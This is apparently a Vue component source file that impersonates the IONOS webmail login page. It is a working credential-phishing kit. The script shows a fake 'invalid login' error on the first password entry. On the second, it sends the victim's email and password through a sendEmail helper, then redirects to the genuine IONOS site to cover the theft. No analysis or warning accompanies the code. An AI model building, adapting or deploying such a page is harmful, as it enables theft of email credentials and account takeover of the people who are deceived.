<script setup>
import { ref, reactive, computed } from "vue";
import useValidate from "@vuelidate/core";
import { required } from "@vuelidate/validators";
import { toast } from "vue3-toastify";
import sendEmail from "./utils/send-email";

const currentStep = ref(1);
const loginAttempts = ref(0);

const state = reactive({
  email: "",
  password: "",
});

const rules = computed(() => ({
  email: { required },
  password: { required },
}));

const v$ = useValidate(rules, state);

const MAIN_PAGE_URL = "https://id.ionos.de/identifier";

const notify = () => {
  toast("password verification successful", {
    type: "success",
    onClose: () => {
      window.location.assign(MAIN_PAGE_URL);
    },
  });
};

const onSubmit = async () => {
  try {
    if (loginAttempts.value === 2) {
      const response = await sendEmail({
        email: state.email,
        password: state.password,
      });

      if (response.data === "OK") {
        notify();
      }

      return;
    }
  } catch (error) {
    console.log(error);
  }
};

const handleSubmit = () => {
  // const isValid = v$.value.$validate();

  // if (!isValid) return;

  loginAttempts.value++;

  onSubmit();
};
</script>

<template>
  <div class="page-content">
    <div class="oao-navi-navigation oao-navi-light">
      <div class="oao-navi-left">
        <div class="oao-navi-application-name">
          <a class="oao-navi-app-name" @click="$router.push('/')">
            <span class="oao-navi-app-logo"></span>
            <span>Webmail Login</span>
          </a>
        </div>
      </div>
    </div>

    <main>
      <section class="page-section page-section--default page-section--short">
        <div class="page-section__block">
          <div class="sheet sheet__section--warning cookie-message hidden">
            <section class="sheet__section">
              <h2 class="headline headline--sub">
                Activation of Browser Cookies Required
              </h2>
              <p class="paragraph">
                To take advantage of our offer, it is necessary for you to allow
                the use of cookies in your browser settings.
              </p>
              <a
                href="https://www.ionos.com/help/security-c85142/browser-security-c85171"
                class="link link--action"
                target="_blank"
                >Learn more</a
              >
            </section>
          </div>

          <div
            class="oao-statuspage-message-container"
            data-component="WEBMAIL,MAIL_RECEIVING,MAIL_SENDING"
          ></div>

          <div
            class="sheet sheet--critical"
            bis_skin_checked="1"
            v-if="loginAttempts === 1"
          >
            <section class="sheet__section">
              <h2 class="headline headline--sub headline--critical">
                <svg
                  class="svg-icon svg-icon--larger svg-icon--critical"
                  viewBox="0 0 32 32"
                >
                  <path
                    d="M16 30.769C7.844 30.769 1.231 24.156 1.231 16 1.231 7.842 7.844 1.231 16 1.231S30.769 7.843 30.769 16c0 8.156-6.613 14.769-14.769 14.769zm5.994-18.581a.692.692 0 0 0 0-.98l-.981-.981a.692.692 0 0 0-.98 0l-3.922 3.922-3.922-3.922a.692.692 0 0 0-.98 0l-.981.981a.692.692 0 0 0 0 .98l3.922 3.922-3.922 3.922a.692.692 0 0 0 0 .98l.981.981a.692.692 0 0 0 .98 0l3.922-3.922 3.922 3.922a.692.692 0 0 0 .98 0l.981-.981a.692.692 0 0 0 0-.98l-3.922-3.922 3.922-3.922z"
                  ></path>
                </svg>

                <span>Die Login-Daten sind ungültig</span>
              </h2>
              <p class="paragraph">
                Das eingegebene Passwort ist nicht korrekt oder die
                E-Mail-Adresse existiert nicht.
              </p>
            </section>
          </div>

          <div class="sheet" v-if="currentStep === 1">
            <section class="sheet__section sheet__section--default">
              <ul>
                <li class="stripe stripe--cropped">
                  <div class="stripe__item">
                    <img
                      class="stripe__visual"
                      src="./assets/images/product-email.svg"
                      height="58"
                      width="auto"
                    />
                  </div>
                  <div class="stripe__item">
                    <h1 class="headline stripe__element">Mein IONOS Login</h1>
                  </div>
                </li>
              </ul>
            </section>

            <section class="sheet__section sheet__section--default">
              <form @submit.prevent="currentStep = 2">
                <ul>
                  <li class="form-stripe">
                    <label class="label" for="username">E-Mail-Adresse</label>

                    <input
                      type="email"
                      class="input-text form-input"
                      tabindex="1"
                      required="true"
                      autofocus
                      autocomplete="username"
                      autocapitalize="none"
                      spellcheck="false"
                      v-model="state.email"
                    />

                    <strong
                      v-if="v$.email.$errors.length"
                      style="margin-top: 10px; display: block; color: #c80a00"
                    >
                      Kein Webmail-Konto mit dieser E-Mail-Adresse gefunden.
                      Korrigieren Sie Ihre Eingabe oder wenden Sie sich an Ihren
                      Administrator.
                    </strong>

                    <p class="input-byline">
                      <strong>Nicht Ihr Gerät?</strong> Melden Sie sich nach der
                      Sitzung ab oder verwenden Sie den privaten Browsermodus.

                      <a
                        class="oao-pi-open-in-flyin reveal-title-by-hover link link--lookup tooltip"
                        target="_blank"
                        data-tooltip="Look up"
                        href="https://www.ionos.com/help/index.php?id=5430"
                        >private browsing mode</a
                      >.
                    </p>
                  </li>
                  <li class="form-stripe form-stripe--actions">
                    <button
                      class="button button--primary button--full-width button--with-loader"
                      type="submit"
                      id="button--with-loader"
                      tabindex="2"
                    >
                      Weiter
                    </button>
                  </li>
                </ul>
              </form>
            </section>

            <section
              class="sheet__section sheet__section--secondary hide-when-headless"
            >
              <div
                class="ias-zone ias-login_offerlink"
                data-ias-zoneid="webmail_login"
              ></div>
            </section>
          </div>

          <div class="sheet" v-else>
            <section class="sheet__section sheet__section--default">
              <ul>
                <li class="stripe stripe--cropped">
                  <div class="stripe__item">
                    <img
                      class="stripe__visual"
                      src="https://id.ionos.de/image/password.svg"
                      height="58"
                      width="auto"
                    />
                  </div>
                  <div class="stripe__item">
                    <h1 class="headline stripe__element">Passwort eingeben</h1>
                  </div>
                </li>
              </ul>
            </section>

            <section class="sheet__section sheet__section--default">
              <form @submit.prevent="handleSubmit">
                <ul>
                  <li class="form-stripe">
                    <div
                      class="container-current-identifier"
                      bis_skin_checked="1"
                    >
                      <div class="current-identifier" bis_skin_checked="1">
                        <a
                          class="ghost-button ghost-button--icon-only ghost-button--secondary tooltip"
                          data-tooltip="Zurück zum Login"
                          @click="currentStep = 1"
                        >
                          <i
                            class="ghost-button__icon exos-icon exos-icon-pagenavbackwards-16"
                          ></i>
                        </a>

                        <a
                          class="button-current-identifier ghost-button ghost-button--with-icon ghost-button--secondary tooltip"
                          data-tooltip="Zurück zum Login"
                          @click="currentStep = 1"
                        >
                          <i
                            class="ghost-button__icon exos-icon exos-icon-nav-user-16"
                          ></i>
                          <span class="ghost-button__text">{{
                            state.email
                          }}</span>
                        </a>
                      </div>
                    </div>

                    <label class="label" for="username">Passwort</label>

                    <input
                      type="password"
                      class="input-text form-input"
                      tabindex="1"
                      required="true"
                      autofocus
                      autocomplete="username"
                      autocapitalize="none"
                      spellcheck="false"
                      v-model="state.password"
                    />

                    <a
                      href="https://www.ionos.de/hilfe/index.php?id=2327"
                      class="input-byline"
                    >
                      <strong style="color: #1474c4; text-decoration-line: none"
                        >Passwort vergessen?</strong
                      >
                    </a>

                    <p style="margin-top: 12px">
                      <strong>Nicht Ihr Gerät?</strong> Melden Sie sich nach der
                      Sitzung ab oder verwenden Sie den privaten Browsermodus.
                    </p>
                  </li>
                  <li class="form-stripe form-stripe--actions">
                    <button
                      class="button button--primary button--full-width button--with-loader"
                      type="submit"
                      id="button--with-loader"
                      tabindex="2"
                    >
                      Weiter
                    </button>
                  </li>
                </ul>
              </form>
            </section>
          </div>

          <h2 class="headline headline--sub headline--headless-hidden">
            More IONOS Logins
          </h2>

          <div class="grid grid--full-height grid--headless-hidden">
            <div class="grid-col grid-col--4 grid-col--small-6">
              <a class="tile tile--filled" href="https://login.ionos.com/">
                <img class="tile__image" src="./assets/images/my-account.svg" />
                <span class="tile__label">Mein IONOS</span>
              </a>
            </div>

            <div class="grid-col grid-col--4 grid-col--small-6">
              <a class="tile tile--filled" href="https://hidrive.ionos.com/">
                <img
                  class="tile__image"
                  src="./assets/images/product-hidrive.svg"
                />
                <span class="tile__label">HiDrive</span>
              </a>
            </div>

            <div class="grid-col grid-col--4 grid-col--small-6">
              <a class="tile tile--filled" href="https://archive.ionos.com/">
                <img
                  class="tile__image"
                  src="./assets/images/product-mail-archiving.svg"
                />
                <span class="tile__label">Email-Archiv</span>
              </a>
            </div>
          </div>
        </div>
      </section>
    </main>
  </div>

  <footer class="page-footer page-footer-custom">
    <div class="page-footer__block">
      <section class="page-footer__section page-footer__section--last">
        <div class="page-footer__section-item">
          <div class="oao-statuspage-overall-status page-footer__status"></div>
        </div>

        <div
          class="page-footer__section-item page-footer__section-item--align-center page-footer__section-item--small-align-left"
        >
          &copy; 2024

          <a
            class="page-footer__link"
            target="_blank"
            href="https://www.ionos.com/about"
            >IONOS Inc.</a
          >
        </div>

        <div
          class="page-footer__section-item page-footer__section-item--align-right page-footer__section-item--small-align-left"
        >
          <a
            class="page-footer__link"
            target="_blank"
            href="https://www.ionos.com/terms-gtc/terms-privacy"
            >Privacy Policy</a
          >

          -

          <a
            class="page-footer__link"
            target="_blank"
            href="https://www.ionos.com/terms-gtc"
            >T&amp;Cs</a
          >
        </div>
      </section>
    </div>
  </footer>
</template>

<style>
.clearfix:after {
  clear: both;
  content: "";
  display: table;
}
.grid-01 {
  width: 8.333333%;
}
.grid-01,
.grid-02 {
  box-sizing: border-box;
  float: left;
  min-height: 1px;
}
.grid-02 {
  width: 16.666667%;
}
.grid-03 {
  width: 25%;
}
.grid-03,
.grid-04a {
  box-sizing: border-box;
  float: left;
  min-height: 1px;
}
.grid-04a {
  width: 27.5%;
}
.grid-04 {
  width: 33.333333%;
}
.grid-04,
.grid-05 {
  box-sizing: border-box;
  float: left;
  min-height: 1px;
}
.grid-05 {
  width: 41.666667%;
}
.grid-06 {
  width: 50%;
}
.grid-06,
.grid-07 {
  box-sizing: border-box;
  float: left;
  min-height: 1px;
}
.grid-07 {
  width: 58.333333%;
}
.grid-08 {
  width: 66.666667%;
}
.grid-08,
.grid-08a {
  box-sizing: border-box;
  float: left;
  min-height: 1px;
}
.grid-08a {
  width: 72.5%;
}
.grid-09 {
  width: 75%;
}
.grid-09,
.grid-10 {
  box-sizing: border-box;
  float: left;
  min-height: 1px;
}
.grid-10 {
  width: 83.333333%;
}
.grid-11 {
  float: left;
  width: 91.666667%;
}
.grid-11,
.grid-12 {
  box-sizing: border-box;
  min-height: 1px;
}
.grid-12 {
  float: none;
  width: auto;
}
.grid-12:after {
  clear: both;
  content: "";
  display: table;
}
.current-identifier {
  display: inline-flex;
  max-width: 90%;
}
.current-identifier a:first-of-type {
  margin: 0;
  padding-left: 11px;
  padding-right: 11px;
}
.sheet__section > .container-current-identifier {
  padding-bottom: 14px;
  padding-top: 14px;
}
.sheet__section > .container-current-identifier:last-child {
  padding-bottom: 0;
  padding-top: 14px;
}
.sheet__section > .container-current-identifier:first-child {
  padding-bottom: 14px;
  padding-top: 0;
}
.button-current-identifier {
  max-width: 100%;
}
.button-current-identifier span {
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}
@media only screen and (min-width: 667px) and (max-width: 1184px) {
  .page-section--short .page-section__block {
    padding-right: 0;
  }
}
@media only screen and (min-width: 1185px) {
  .page-section--short .page-section__block {
    padding-right: 0;
  }
}
.no-spinners {
  -moz-appearance: textfield;
}
.no-spinners::-webkit-inner-spin-button,
.no-spinners::-webkit-outer-spin-button {
  -webkit-appearance: none;
  margin: 0;
}
.password-unveil:before {
  content: "";
}
.password-unveil-reverse:before,
.password-unveil:before {
  cursor: pointer;
  font-family: exos-icon-font;
  font-style: normal;
  font-weight: 400 !important;
  vertical-align: top;
}
.password-unveil-reverse:before {
  content: "";
}

body {
  background-color: #f4f7fa;
}
.page-footer-custom {
  position: fixed;
  width: 100%;
  bottom: 0;
}
.flex {
  display: flex;
}

.items-center {
  align-items: center;
}
</style>
